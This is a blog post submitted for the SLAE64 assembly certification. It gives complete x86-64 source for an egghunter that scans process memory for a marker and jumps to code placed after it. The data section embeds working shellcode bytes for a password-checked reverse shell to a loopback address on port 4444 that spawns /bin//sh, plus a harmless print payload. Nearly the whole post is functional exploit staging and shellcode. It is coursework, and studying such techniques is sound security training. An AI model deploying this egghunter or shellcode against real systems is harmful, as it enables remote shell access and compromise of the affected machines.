---
layout: post
title: SLAE64 Assignment 3 - egghunter
excerpt: asm code for my egghunter
---

    ; name        : egghunter 
    ; author      : Sandro "guly" Zaccarini SLAE64-1497
    ; purpose     : this code has been written for SLAE64 assignment 3
    ; license     : CC-BY-NC-SA
    ; description :
    ; this code will search a string in memory, repeated twice to avoid potential false
    ; positives, and when finds it jumps just after to execute following code.
    ; because this course is about assembly, i'm trying avoid any C code, therefore also
    ; stage2 will be placed in this file in data section.
    ;
    ; the program starts from address memory near 0x400000 because i know that .data places
    ; values there, and reads 4 bytes to compare to a known egg
    ; should be noted that a different scenario, where for example i exploited a buffer
    ; overflow, i could've places stage2 at stack page and the seek would be way longer
    ;
    ; i also know that not all addresses are readable by the program: that's why i'm
    ; checking if i can read before to compare.
    
      global _start
      section .text
    
      exit:
    xor rax,rax
    mov rdi,rax
    mov al,0x3C
    syscall
    
      _start:
    ; start by zeroing some regs
    xor rax,rax
    push rax
    pop rdx
    push rax
    pop rsi
    push rax
    pop r14
    ; and because i won't need ebx, and ecx will be completely overwritten by a mov later
    
    ; GUGU will match revshell, little endian, placed at like 0x40208c
    ; i'm using 32bit registers here because using 64 will make this code to match as egg
    mov r14d, 0x55475547
    ; LYLY will match writeHelo, little endian, placed at like 0x402000
    ;mov r14d, 0x594c594c
    
    ; i'm starting somewhere near from 0x400000 because i know where to look
    ;mov edx, 0x400001 ; this has null, let's xor it
    mov edx,0x11510110
    ;mov edx,10501010
    xor edx,0x11111111
    
      nextp:
    ; align page, for this example i would have it 0x400fff
    or dx, 0xfff
    ; now edx will hold 0x400000 and so on
    
      nextb:
    ; and with this inc i'll be at the top of the memory page, which will be 0x400001
    inc rdx
    
    ; inc rdx will result in an overflow of our 64bit register sooner or later
    ; by checking OF flag, we know that we reached the end of the memory:
    ; to avoid DoSsing the box, we call a neat exit
    jo exit
    
    ; check if we can read the memory
    ; i'm using sys_access syscall here, that has code 0x15
    ; she needs of course arguments:
    ; rax => sys_access id, 0x15
    ; rdi => pointer to page address
    xor rax, rax
    mov al, 0x15
    lea rdi, [rdx+0x4]
    
    ; do the call
    syscall
    
    ; as usual, eax will hold res code. EFAULT, means noaccess, is 0xf2
    cmp al, 0xf2
    ; if we have a fault here, jump to next page by adding 0x1000
    jz nextp
    
    ; search for the egg
    cmp [edx], r14d
    jnz nextb
    
    ; search again for 2nd copy of the egg (avoid matching code itself or any other false positive)
    cmp [edx+4], r14d
    jnz nextb
    
    ; egg found, jump to shellcode
    lea esi, [edx + 8]
    jmp rsi
    
      section .data
    ; looking for EGG GUGU i'm going to receive a revshell on localhost port 4444 by using the code from 03_revshell_tcp.asm
    ;revshell: db  0x47,0x55,0x47,0x55,0x47,0x55,0x47,0x55
    revshell: db  0x47,0x55,0x47,0x55,0x47,0x55,0x47,0x55,0x48,0x31,0xc0,0x50,0x5e,0x56,0x5a,0x50,0x5f,0x66,0x83,0xc0,0x29,0x40,0xb7,0x02,0x48,0xff,0xc6,0x0f,0x05,0x89,0xc7,0x48,0x31,0xc0,0x50,0xc7,0x44,0x24,0x04,0x7f,0x01,0x01,0x01,0x66,0xc7,0x44,0x24,0x02,0x11,0x5c,0xc6,0x04,0x24,0x02,0x54,0x5e,0x6a,0x10,0x5a,0xb0,0x2a,0x0f,0x05,0x31,0xc0,0x48,0x31,0xf6,0xb0,0x21,0x0f,0x05,0xb0,0x21,0xff,0xc6,0x0f,0x05,0xb0,0x21,0xff,0xc6,0x0f,0x05,0x48,0x31,0xd2,0x48,0x89,0xd0,0x52,0xb2,0x04,0x48,0x89,0xe6,0x4c,0x89,0xcf,0x0f,0x05,0x81,0x3c,0x24,0x67,0x75,0x6c,0x79,0x75,0xe6,0x48,0x31,0xc0,0x50,0x48,0x89,0xe2,0x48,0xbb,0x2f,0x62,0x69,0x6e,0x2f,0x2f,0x73,0x68,0x53,0x48,0x89,0xe7,0x50,0x57,0x48,0x89,0xe6,0x48,0x83,0xc0,0x3b,0x0f,0x05
    ; looking for EGG LYLY i'm just printing Helo string
    writeHelo: db 0x4c,0x59,0x4c,0x59,0x4c,0x59,0x4c,0x59,0x48,0x31,0xc0,0x48,0x31,0xff,0x48,0xff,0xc7,0x50,0x48,0xbb,0x6c,0x6c,0x6f,0x20,0x67,0x75,0x6c,0x79,0x53,0x66,0x68,0x68,0x65,0x48,0x89,0xe6,0xb0,0x01,0x48,0x89,0xc2,0xb2,0x0a,0x0f,0x05,0x48,0x31,0xc0,0x48,0x89,0xc7,0xb0,0x3c,0x0f,0x05
    
    ; This blog post has been created for completing the requirements of the SecurityTube Linux Assembly Expert certification: http://securitytube-training.com/online-courses/securitytube-linux-assembly-expert/
